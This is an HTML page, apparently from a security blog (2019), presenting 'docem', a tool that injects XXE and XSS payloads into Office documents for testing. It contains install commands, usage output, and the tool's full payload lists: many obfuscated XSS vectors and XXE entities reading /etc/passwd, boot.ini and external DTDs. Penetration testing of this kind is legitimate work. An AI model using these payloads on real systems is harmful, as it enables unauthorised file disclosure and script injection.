@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="dark">
+    <meta name="theme-color" content="#040405">
+
+    
+    <title>If you find powerful OXML XXE tool? it's "DOCEM" | HAHWUL</title>
+
+    
+    
+        <meta name="description" content="Offensive Security Engineer, Developer and H4cker.">
+    
+
+    
+    <meta property="og:title" content="If you find powerful OXML XXE tool? it&apos;s &quot;DOCEM&quot;">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2019/oxml-xxe-payload-inject-tool-docem/">
+  <meta property="og:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta property="og:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="If you find powerful OXML XXE tool? it&apos;s &quot;DOCEM&quot;">
+  <meta name="twitter:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta name="twitter:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+    <meta property="og:site_name" content="PIXN">
+    <meta property="og:locale" content="en_US">
+
+    
+    <link rel="canonical" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2019/oxml-xxe-payload-inject-tool-docem/">
+    
+
+    
+    <link rel="alternate" type="application/rss+xml" title="HAHWUL" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/rss.xml">
+    
+
+    
+    <link rel="icon" type="image/png" href="/favicon.svg" sizes="96x96" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="shortcut icon" href="/favicon.svg" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.svg" />
+    <meta name="apple-mobile-web-app-title" content="PIXN" />
+    <link rel="manifest" href="/icons/site.webmanifest" />
+
+    
+    <link rel="preload" as="image" href="/images/pixn-mark.svg">
+
+    
+    <link rel="stylesheet" href="/fonts/pretendard/pretendardvariable-dynamic-subset.css">
+
+    
+    <link rel="stylesheet" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/main.8885b746.css">
+
+    
+    <link rel="stylesheet" href="/assets/css/highlight/atom-one-dark.min.css?v=f44d507f">
+
+    
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"If you find powerful OXML XXE tool? it's \"DOCEM\"","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2019/oxml-xxe-payload-inject-tool-docem/","datePublished":"2019-09-28T00:00:00+00:00","dateModified":"2021-11-28T00:00:00+00:00","image":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og-images/blog-2019-oxml-xxe-payload-inject-tool-docem.png"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HAHWUL","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/"},{"@type":"ListItem","position":2,"name":"Archive","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/archive/"},{"@type":"ListItem","position":3,"name":"Blog","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/"},{"@type":"ListItem","position":4,"name":"Untitled","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2019/"},{"@type":"ListItem","position":5,"name":"If you find powerful OXML XXE tool? it's \"DOCEM\""}]}</script>
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"WebSite","name":"HAHWUL","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/","description":"Offensive Security Engineer, Developer and H4cker.","potentialAction":{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/?q={search_term_string}"},"query-input":"required name=search_term_string"}}</script>
+</head>
+
+<body>
+    <a class="skip-link sr-only" href="#main-content">Skip to content</a>
+    <div class="site-wrapper">
+        <header class="site-header">
+            <div class="header-content">
+                <nav class="main-nav">
+    <div class="nav-logo">
+        <a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/" aria-label="PIXN, home">
+            <span class="hw-mark" aria-hidden="true"></span>
+            <span class="nav-wordmark" aria-hidden="true">PIXN</span>
+        </a>
+    </div>
+
+    <button class="nav-toggle" aria-label="Toggle navigation" aria-expanded="false" aria-controls="nav-menu">
+        <span></span>
+        <span></span>
+        <span></span>
+    </button>
+
+    <div class="nav-overlay"></div>
+
+    <div class="nav-menu" id="nav-menu">
+        <a href="/posts/">Posts</a>
+        <a href="/notes/">Notes</a>
+        <a href="/projects/">Projects</a>
+        <a href="/about/">About</a>
+    </div>
+
+    <button class="nav-search" type="button" data-search-trigger aria-label="Open search">
+        <span class="nav-search-key" data-search-key aria-hidden="true">⌘K</span>
+    </button>
+</nav>
+
+<script>
+(function() {
+    const navToggle = document.querySelector('.nav-toggle');
+    const navMenu = document.querySelector('.nav-menu');
+    const navOverlay = document.querySelector('.nav-overlay');
+    const body = document.body;
+
+    function openMenu() {
+        navToggle.setAttribute('aria-expanded', 'true');
+        navToggle.classList.add('active');
+        navMenu.classList.add('active');
+        navOverlay.classList.add('active');
+        body.classList.add('nav-open');
+    }
+
+    function closeMenu() {
+        navToggle.setAttribute('aria-expanded', 'false');
+        navToggle.classList.remove('active');
+        navMenu.classList.remove('active');
+        navOverlay.classList.remove('active');
+        body.classList.remove('nav-open');
+    }
+
+    if (navToggle && navMenu) {
+        navToggle.addEventListener('click', function() {
+            const isExpanded = navToggle.getAttribute('aria-expanded') === 'true';
+            if (isExpanded) {
+                closeMenu();
+            } else {
+                openMenu();
+            }
+        });
+
+        // Close menu when clicking overlay
+        if (navOverlay) {
+            navOverlay.addEventListener('click', closeMenu);
+        }
+
+        // Close menu when clicking a link
+        navMenu.querySelectorAll('a').forEach(function(link) {
+            link.addEventListener('click', closeMenu);
+        });
+
+        // Close menu on escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeMenu();
+            }
+        });
+    }
+})();
+</script>
+            </div>
+        </header>
+
+        <main id="main-content">
+            <div class="container">
+                
+
+<div class="post-wrapper">
+    <article class="post-content">
+        <header class="page-header">
+            <h1 class="page-title">If you find powerful OXML XXE tool? it's "DOCEM"</h1>
+            <div class="post-meta-section">
+                <div class="post-meta">
+                    
+                    <time class="meta-item" datetime="2019-09-28">
+                        SEPTEMBER 28, 2019
+                    </time>
+                     
+                </div>
+            </div>
+
+            
+            <p class="page-description">Offensive Security Engineer, Developer and H4cker.</p>
+            
+        </header>
+
+        <div class="post-body"><p>XXE 테스트 시 쓸만한 도구 하나 찾아서 공유드립니다.
+직접 노가다하거나 기존에 공개됬던 툴보단 훨씬 편리할 것 같습니다.</p>
+<p>When I tested OXML XXE, OOXML XXE, I used to create payload myself or used <a href="https://github.com/BuffaloWill/oxml_xxe">this tool</a>.</p>
+<p>Recently, i found powerful tool, I’d like to share a this tool, <a href="https://github.com/whitel1st/docem">docem</a>.</p>
+<p>If you would like to know how to insert payload you self, please refer to the <a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2017/05/web-hacking-ooxml-xxe.html">this link</a>.
+There’s a similar tool on burp extension.
+<a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2017/12/web-hacking-ooxml-xxe-with-burp.html">https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2017/12/web-hacking-ooxml-xxe-with-burp.html</a></p>
+<p><img loading="lazy" src="https://1.bp.blogspot.com/-HXzMYtqP3aU/XY-M_dLC4rI/AAAAAAAAEeM/YxOnzT4blwEZOdlrDBjKtbFfQpIJAj0_QCLcBGAsYHQ/s1600/1414.gif" alt="Powerful!!!" /></p>
+<h2 id="how-to-install">How to install?</h2>
+<p>Just simple.</p>
+<p>oneline command</p>
+<pre><code>git clone https://github.com/whitel1st/docem;cd docem;pip3 install -r requirements.txt;alias add docem=&quot;python3 $(pwd)/docem.py&quot;
+
+</code></pre>
+<ol>
+<li>clone docem repo</li>
+</ol>
+<pre><code>git clone https://github.com/whitel1st/docem
+cd docem
+
+</code></pre>
+<ol start="2">
+<li>Install required packages</li>
+</ol>
+<pre><code>pip3 install -r requirements.txt
+
+</code></pre>
+<ol start="3">
+<li>Run docem</li>
+</ol>
+<pre><code>python3 docem.py
+
+usage: docem.py [-h] [-s SAMPLE] [-pm {xss,xxe}] [-kt]
+                [-pt {per_place,per_file,per_document}] [-sx SAMPLE_EXTENSION]
+                [-pf PAYLOAD_FILE]
+
+Create docx,odt,pptx,etc files with XXE/XSS payloads
+
+required arguments:
+  -s SAMPLE             path to sample file
+  -pm {xss,xxe}         payload mode: embedding XXE or XSS in a file
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -kt                   do not delete unpacked and modified folders
+  -pt {per_place,per_file,per_document}
+                        how many payloads will be in one file. per_document is
+                        default
+  -sx SAMPLE_EXTENSION  d
+  -pf PAYLOAD_FILE      path to a file with payloads to embed
+
+</code></pre>
+<p>tip) Alias command</p>
+<pre><code>alias add docem=&quot;python3 $(pwd)/docem.py&quot;
+
+</code></pre>
+<h2 id="inject-xxe-payload-to-officewordexcel-etc-file">Inject XXE Payload to Office(word,excel etc…) file</h2>
+<p>It’s easy to create payloads through the docem.</p>
+<p>query</p>
+<pre><code>docem -s samples/xxe/sample_oxml_xxe.docx -pm xxe -pf payloads/xxe_special_2.txt -kt -pt per_document -sx docx
+
+</code></pre>
+<p>output</p>
+<pre><code>Current magic_symbol:  XXCb8bBA9XX
+
+=========== Current setup ===========
+sample file:         samples/xxe/sample_oxml_xxe.docx
+sample is it dir:     False
+payload mode:         xxe
+payload file:         payloads/xxe_special_2.txt
+payload type:         per_document
+number of payloads:     3
+keep upacked files:     True
+
+======== Count magic symbols ========
+    0    symbols in docProps_app
+    0    symbols in docProps_core
+    0    symbols in _rels_
+    ....snip....
+
+payload_0
+    packed to: tmp/sample_oxml_xxe-per_document-payload_0_1569687338738463.docx
+
+payload_1
+    packed to: tmp/sample_oxml_xxe-per_document-payload_1_1569687338751476.docx
+
+payload_2
+    packed to: tmp/sample_oxml_xxe-per_document-payload_2_156968733876288.docx
+
+</code></pre>
+<p>Extract Payload file…</p>
+<pre><code>unzip sample_oxml_xxe-per_document-payload_2_156968733876288.docx
+Archive:  sample_oxml_xxe-per_document-payload_2_156968733876288.docx
+   creating: _rels/
+   creating: docProps/
+   creating: word/
+  inflating: [Content_Types].xml
+  inflating: docProps/app.xml
+  inflating: docProps/core.xml
+  inflating: _rels/.rels
+   creating: word/_rels/
+   creating: word/theme/
+  inflating: word/fontTable.xml
+  inflating: word/document.xml
+  inflating: word/settings.xml
+  inflating: word/webSettings.xml
+  inflating: word/styles.xml
+  inflating: word/stylesWithEffects.xml
+  inflating: word/theme/theme1.xml
+  inflating: word/_rels/document.xml.rels
+
+</code></pre>
+<p>You find Injected Payload</p>
+<pre><code>cat document.xml
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE roottag PUBLIC &quot;-//OXML/XXE/EN&quot; &quot;http://127.0.0.1/a.dtd//etc/passwd&quot;&gt;
+
+</code></pre>
+<h2 id="all-payloads">All Payloads..</h2>
+<h3 id="empty">Empty</h3>
+<ol>
+<li>payload/no_payload.txt</li>
+</ol>
+<pre><code>no_payload%
+
+</code></pre>
+<h3 id="xxs">XXS</h3>
+<ol start="2">
+<li>payload/xss_all.txt</li>
+</ol>
+<pre><code>xss_test
+&amp;apos;&amp;quot;&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;
+&amp;apos;&amp;quot;&amp;gt;&amp;lt;svg onload=alert(2)&gt;
+&amp;apos;&amp;quot;&gt;&amp;lt;svg onload=alert(3)&amp;gt;
+&amp;apos;&amp;quot;&gt;&amp;lt;svg onload=alert(4)&gt;
+&lt;!--'&quot;&gt;&lt;--&gt;svg onload=alert(5)&lt;!--&gt;--&gt;
+&lt;!--'&quot;&gt;&lt;--&gt;svg onload=alert(6)&gt;
+&lt;!--'&quot;&gt;&lt;svg onload=alert(7)&gt;--&gt;
+&lt;![CDATA[&quot;'&gt;&lt;]]&gt;svg onload=alert(8)&gt;
+&lt;![CDATA[&quot;'&gt;&lt;]]&gt;svg onload=alert(9)&lt;![CDATA[&gt;]]&gt;
+&amp;#39;&amp;#34;&amp;#62;&amp;#60;svg onload=alert(10)&amp;#62;
+&amp;#39;&amp;#34;&gt;&amp;#60;svg onload=alert(11)&amp;#62;
+&amp;#39;&amp;#34;&amp;#62;&amp;#60;svg onload=alert(12)&gt;
+&amp;#39;&amp;#34;&gt;&amp;#60;svg onload=alert(13)&gt;
+&amp;#x0027;&amp;#x0022;&amp;#x003E;&amp;#x003C;svg onload=alert(14)&amp;#x003E;
+&amp;#x0027;&amp;#x0022;&amp;#x003E;&amp;#x003C;svg onload=alert(15)&gt;
+&amp;#x0027;&amp;#x0022;&gt;&amp;#x003C;svg onload=alert(16)&amp;#x003E;
+&amp;#x0027;&amp;#x0022;&gt;&amp;#x003C;svg onload=alert(17)&gt;
+%27%22%3E%3Csvg onload=alert(18)%3E
+%27%22&gt;%3Csvg%20onload%3Dalert(19)&gt;
+%27%22&gt;%3Csvg onload=alert(20)&gt;
+%27%22%3E%3Csvg%20onload%3Dalert(21)%3E
+%27%22%3E%3Csvg%20onload%3Dalert(22)&gt;
+&lt;![CDATA[&lt;script&gt;var n=0;while(true){n++;}&lt;/script&gt;]]&gt;
+&lt;![CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;alert(23);&lt;![CDATA[&lt;]]&gt;/SCRIPT&lt;![CDATA[&gt;]]&gt;
+&lt;![CDATA[&lt;IMG SRC=x on]]&gt;&lt;![CDATA[load=alert(24);&quot;&gt;]]&gt;
+javascript:alert(25)
+java%0ascript:alert(26)
+java%09script:alert(27)
+java%0dscript:alert(28)
+java%0a%0dscript:alert(29)
+java%0d%0ascript:alert(30)
+\j\av\a\s\cr\i\pt\:\a\l\ert\(31\)
+javascript://%0Aalert(32)
+javascript://anything%0D%0A%0D%0Awindow.alert(33)
+&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#51;&amp;#52;&amp;#41;&amp;#59;
+&amp;#x006A;&amp;#x0061;&amp;#x0076;&amp;#x0061;&amp;#x0073;&amp;#x0063;&amp;#x0072;&amp;#x0069;&amp;#x0070;&amp;#x0074;&amp;#x003A;alert(35)&amp;#x003B;
+%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341
+
+</code></pre>
+<ol start="3">
+<li>payload/xss_tiny.txt</li>
+</ol>
+<pre><code>&amp;apos;&amp;quot;&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;
+&amp;#x0027;&amp;#x0022;&amp;#x003E;&amp;#x003C;svg onload=alert(14)&amp;#x003E;
+%27%22%3E%3Csvg%20onload%3Dalert(21)%3E
+
+</code></pre>
+<h3 id="xxe">XXE</h3>
+<ol start="4">
+<li>payload/xxe_special_1.txt</li>
+</ol>
+<pre><code>{&quot;vector&quot;:&quot;&lt;!DOCTYPE docem [&lt;!ENTITY xxe_canary \&quot;XXE_STRING\&quot;&gt;]&gt;&quot;,&quot;reference&quot;:&quot;&amp;xxe_canary;&quot;}
+
+</code></pre>
+<ol start="5">
+<li>payload/xxe_special_2.txt</li>
+</ol>
+<pre><code>{&quot;vector&quot;:&quot;&lt;!DOCTYPE docem [&lt;!ENTITY xxe_test \&quot;XXE_STRING\&quot;&gt;]&gt;&quot;,&quot;reference&quot;:&quot;&quot;}
+{&quot;vector&quot;:&quot;&lt;!DOCTYPE docem [&lt;!ENTITY xxe_canary_0 \&quot;XXE_STRING\&quot;&gt;]&gt;&quot;,&quot;reference&quot;:&quot;&amp;xxe_canary_0;&quot;}
+{&quot;vector&quot;:&quot;&lt;!DOCTYPE docem [&lt;!ELEMENT docem ANY &gt;&lt;!ENTITY xxe_canary_2 SYSTEM \&quot;file:///etc/lsb-release\&quot;&gt;]&gt;&quot;,&quot;reference&quot;:&quot;&amp;xxe_canary_2;&quot;}
+
+</code></pre>
+<ol start="6">
+<li>payload/xxe_special_3.txt</li>
+</ol>
+<pre><code>{&quot;vector&quot;:&quot;&lt;!DOCTYPE docem [&lt;!ENTITY xxe_test \&quot;XXE_STRING\&quot;&gt;]&gt;&quot;,&quot;reference&quot;:&quot;&quot;}
+{&quot;vector&quot;:&quot;&lt;!DOCTYPE docem [&lt;!ENTITY xxe_canary_0 \&quot;XXE_STRING\&quot;&gt;]&gt;&quot;,&quot;reference&quot;:&quot;&amp;xxe_canary_0;&quot;}
+{&quot;vector&quot;:&quot;&lt;!DOCTYPE docem [&lt;!ELEMENT docem ANY &gt;&lt;!ENTITY xxe_canary_2 SYSTEM \&quot;file:///etc/lsb-release\&quot;&gt;]&gt;&quot;,&quot;reference&quot;:&quot;&amp;xxe_canary_2;&quot;}
+{&quot;vector&quot;:&quot;&lt;!DOCTYPE docem [&lt;!ELEMENT docem ANY &gt;&lt;!ENTITY xxe_canary_3 SYSTEM \&quot;file:///etc/passwd\&quot;&gt;]&gt;&quot;,&quot;reference&quot;:&quot;&amp;xxe_canary_3;&quot;}
+{&quot;vector&quot;:&quot;&lt;!DOCTYPE docem [&lt;!ELEMENT docem ANY &gt;&lt;!ENTITY xxe_canary_4 SYSTEM \&quot;file:///c:/boot.ini\&quot;&gt;]&gt;&quot;,&quot;reference&quot;:&quot;&amp;xxe_canary_4;&quot;}
+
+</code></pre>
+<ol start="7">
+<li>payload/xxe_special_4.txt</li>
+</ol>
+<pre><code>{&quot;vector&quot;:&quot;&lt;!DOCTYPE docem [&lt;!ENTITY xxe_test \&quot;XXE_STRING\&quot;&gt;]&gt;&quot;,&quot;reference&quot;:&quot;&quot;}
+{&quot;vector&quot;:&quot;&lt;!DOCTYPE docem [&lt;!ENTITY xxe_canary_0 \&quot;XXE_STRING\&quot;&gt;]&gt;&quot;,&quot;reference&quot;:&quot;&amp;xxe_canary_0;&quot;}
+{&quot;vector&quot;:&quot;&lt;!DOCTYPE docem [&lt;!ELEMENT docem ANY &gt;&lt;!ENTITY xxe_canary_2 SYSTEM \&quot;file:///etc/lsb-release\&quot;&gt;]&gt;&quot;,&quot;reference&quot;:&quot;&amp;xxe_canary_2;&quot;}
+{&quot;vector&quot;:&quot;&lt;!DOCTYPE docem [&lt;!ELEMENT docem ANY &gt;&lt;!ENTITY xxe_canary_3 SYSTEM \&quot;file:///etc/passwd\&quot;&gt;]&gt;&quot;,&quot;reference&quot;:&quot;&amp;xxe_canary_3;&quot;}
+{&quot;vector&quot;:&quot;&lt;!DOCTYPE docem [&lt;!ELEMENT docem ANY &gt;&lt;!ENTITY xxe_canary_4 SYSTEM \&quot;file:///c:/boot.ini\&quot;&gt;]&gt;&quot;,&quot;reference&quot;:&quot;&amp;xxe_canary_4;&quot;}
+{&quot;vector&quot;:&quot;&lt;!DOCTYPE docem [&lt;!ELEMENT docem ANY &gt;&lt;!ENTITY xxe_canary_5 SYSTEM \&quot;file:///etc/issue\&quot;&gt;]&gt;&quot;,&quot;reference&quot;:&quot;&amp;xxe_canary_5;&quot;}
+{&quot;vector&quot;:&quot;&lt;!DOCTYPE docem [&lt;!ELEMENT docem ANY &gt;&lt;!ENTITY % xxe_canary_6 SYSTEM \&quot;file:///etc/issue\&quot;&gt;&lt;!ENTITY % dtd SYSTEM \&quot;custom_domain\&quot;&gt;%dtd;%trick;]&gt;  ]&gt;&quot;,&quot;reference&quot;:&quot;&quot;}
+
+</code></pre>
+<ol start="8">
+<li>payload/xxe_special_5.txt</li>
+</ol>
+<pre><code>{&quot;vector&quot;:&quot;&lt;!DOCTYPE docem [&lt;!ENTITY xxe_test \&quot;XXE_STRING\&quot;&gt;]&gt;&quot;,&quot;reference&quot;:&quot;&quot;}
+{&quot;vector&quot;:&quot;&lt;!DOCTYPE docem [&lt;!ENTITY xxe_canary_0 \&quot;XXE_STRING\&quot;&gt;]&gt;&quot;,&quot;reference&quot;:&quot;&amp;xxe_canary_0;&quot;}
+{&quot;vector&quot;:&quot;&lt;!DOCTYPE docem [&lt;!ELEMENT docem ANY &gt;&lt;!ENTITY xxe_canary_2 SYSTEM \&quot;file:///etc/lsb-release\&quot;&gt;]&gt;&quot;,&quot;reference&quot;:&quot;&amp;xxe_canary_2;&quot;}
+{&quot;vector&quot;:&quot;&lt;!DOCTYPE docem [&lt;!ELEMENT docem ANY &gt;&lt;!ENTITY xxe_canary_3 SYSTEM \&quot;file:///etc/passwd\&quot;&gt;]&gt;&quot;,&quot;reference&quot;:&quot;&amp;xxe_canary_3;&quot;}
+{&quot;vector&quot;:&quot;&lt;!DOCTYPE docem [&lt;!ELEMENT docem ANY &gt;&lt;!ENTITY xxe_canary_4 SYSTEM \&quot;file:///c:/boot.ini\&quot;&gt;]&gt;&quot;,&quot;reference&quot;:&quot;&amp;xxe_canary_4;&quot;}
+{&quot;vector&quot;:&quot;&lt;!DOCTYPE docem [&lt;!ELEMENT docem ANY &gt;&lt;!ENTITY xxe_canary_4 SYSTEM \&quot;custom_domain_here\&quot;&gt;]&gt;&quot;,&quot;reference&quot;:&quot;&amp;xxe_canary_4;&quot;}
+</code></pre>
+</div>
+
+        <div class="footnotes-area"></div>
+
+        
+            
+            
+                
+                
+                
+                
+                
+                
+                
+                
+            
+        
+    </article>
+
+    
+</div>
+
+            </div>
+        </main>
+
+        <footer class="site-footer">
+    <div class="container">
+        <div class="footer-content">
+            <span class="hw-mark footer-mark" aria-hidden="true"></span>
+            <nav class="footer-menu" aria-label="Footer">
+                <a href="/tags/">TAGS</a>
+                <a href="/about/uses/">USES</a>
+                <a href="/contact/">CONTACT</a>
+                <a href="/feeds/">FEEDS</a>
+                <a href="/privacy/">PRIVACY</a>
+            </nav>
+            <div class="socials">
+                <a
+                    href="https://github.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="GitHub"
+                    aria-label="GitHub"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://x.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="X"
+                    aria-label="X (Twitter)"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://www.instagram.com/hahwul_"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="Instagram"
+                    aria-label="Instagram"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"
+                        /></svg
+                ></a>
+            </div>
+            <p>Developed and Designed by Me<br />2026 HAHWUL.</p>
+        </div>
+    </div>
+</footer>
+        <div
+    class="search-overlay"
+    data-search-overlay
+    data-search-index="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/search_index.json"
+    data-search-empty="Type to search posts, notes, projects and the archive."
+    data-search-no-results="No results found."
+    data-search-loading="Loading index"
+    data-search-error="Unable to load search index. Refresh and try again."
+    aria-hidden="true"
+>
+    <div class="search-panel" role="dialog" aria-modal="true" aria-label="Search">
+        <div class="search-header">
+            <div class="search-input-wrapper">
+                <input
+                    type="search"
+                    name="search"
+                    placeholder="Search the site, #tag to filter"
+                    aria-label="Search the site"
+                    autocomplete="off"
+                    spellcheck="false"
+                    data-search-input
+                >
+            </div>
+            <div class="search-meta">
+                <span class="search-shortcut" data-search-key>⌘K</span>
+                <button class="search-close" type="button" data-search-close aria-label="Close search">
+                    Esc
+                </button>
+            </div>
+        </div>
+        <div class="search-filters" data-search-filters>
+            <div class="search-filter-group" role="group" aria-label="Filter by type" data-filter-group="type">
+                <button type="button" class="search-chip is-active" data-filter-type="all" aria-pressed="true">All<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="post" aria-pressed="false">Posts<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="note" aria-pressed="false">Notes<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="project" aria-pressed="false">Projects<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="archive" aria-pressed="false">Archive<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="page" aria-pressed="false">Pages<span class="search-chip-count" data-chip-count></span></button>
+            </div>
+            <div class="search-filter-group search-filter-group--lang" role="group" aria-label="Filter by language" data-filter-group="lang">
+                <button type="button" class="search-chip is-active" data-filter-lang="all" aria-pressed="true">All</button>
+                <button type="button" class="search-chip" data-filter-lang="en" aria-pressed="false">EN</button>
+                <button type="button" class="search-chip" data-filter-lang="ko" aria-pressed="false">KO</button>
+            </div>
+        </div>
+        <div class="search-status" data-search-status></div>
+        <div class="search-results" data-search-results aria-live="polite">
+            <p class="search-empty" data-search-empty>Type to search posts, notes, projects and the archive.</p>
+        </div>
+    </div>
+</div>
+    </div>
+
+    
+    
+
+    
+    <script src="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/app.1881a2e0.js" defer></script>
+</body>
+
+</html>
